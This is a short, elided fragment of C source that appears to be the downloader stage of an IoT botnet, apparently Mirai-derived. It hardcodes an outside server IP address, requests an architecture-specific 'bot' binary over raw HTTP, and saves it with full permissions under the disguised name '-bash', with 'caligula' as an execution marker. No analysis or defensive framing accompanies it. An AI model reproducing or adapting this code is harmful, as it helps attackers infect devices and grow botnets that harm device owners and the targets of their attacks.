...
#define HTTP_SERVER utils_inet_addr(109,104,151,112)

#define EXEC_MSG            "caligula\n"
...
inline void run(void)
{
    ...
    ffd = open("-bash", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /bot." BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (17 + arch_strlen + 13))
    {
#ifdef DEBUG
